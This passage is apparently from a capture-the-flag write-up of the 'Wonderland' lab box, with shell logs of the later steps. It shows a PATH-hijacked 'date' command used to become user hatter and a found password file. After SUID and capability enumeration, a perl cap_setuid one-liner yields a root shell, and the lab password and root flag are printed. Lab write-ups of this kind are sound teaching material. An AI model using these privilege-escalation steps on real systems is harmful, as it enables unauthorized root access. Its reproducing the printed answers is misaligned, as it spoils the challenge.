rabbit@wonderland:/home/rabbit$ 
```
## It is gonna use prefex of that binary so We successfully make a fake date command that give use other user , before reaching to real date command
### Let run teaParty again
```bash
rabbit@wonderland:/home/rabbit$ ./teaParty 
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by hatter@wonderland:/home/rabbit$ 
````
## Ok i got hatter 
```bash
Probably by hatter@wonderland:/home/rabbit$ cd /home/hatter/
hatter@wonderland:/home/hatter$ ls -la
total 28
drwxr-x--- 3 hatter hatter 4096 May 25  2020 .
drwxr-xr-x 6 root   root   4096 May 25  2020 ..
lrwxrwxrwx 1 root   root      9 May 25  2020 .bash_history -> /dev/null
-rw-r--r-- 1 hatter hatter  220 May 25  2020 .bash_logout
-rw-r--r-- 1 hatter hatter 3771 May 25  2020 .bashrc
drwxrwxr-x 3 hatter hatter 4096 May 25  2020 .local
-rw-r--r-- 1 hatter hatter  807 May 25  2020 .profile
-rw------- 1 hatter hatter   29 May 25  2020 password.txt
hatter@wonderland:/home/hatter$ 
```
### I got a file password.txt maybe it for hatter 
```bash
hatter@wonderland:/home/hatter$ cat password.txt 
WhyIsARavenLikeAWritingDesk?
hatter@wonderland:/home/hatter$ su hatter 
Password: 
hatter@wonderland:~$ 
hatter@wonderland:~$ whoami
hatter
hatter@wonderland:~$ 
```
# I dont think it make any difference
## Let find suid file
```bash
find / -user root -perm /4000 2>/dev/null
```
### I dont get any useful files
## Let try again
```bash
getcap -r / 2>/dev/null
```
# I got perl Capabilities here with suid 
```bash
alice@wonderland:~$ getcap -r / 2>/dev/null 
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
```
# 8. Let Get Root 
### Let search on gtfobin for perl Capabilities
![Screenshot from 2024-04-06 01-43-55](https://github.com/Esther7171/Wonderland/assets/122229257/cfe08d6f-8449-4d22-9aa6-5a2602edfffb)

### So let run this 
## I just modify last line of sh to bash ```perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'```
```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```
```bash
hatter@wonderland:~$ whoami
hatter
hatter@wonderland:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
root@wonderland:~# 
```
## Boom !! 
```bash
root@wonderland:~# ls
linpeas.sh.save  password.txt
root@wonderland:~# cd /home/alice/
root@wonderland:/home/alice# cat root.txt 
thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}
root@wonderland:/home/alice# 
```
# 😄
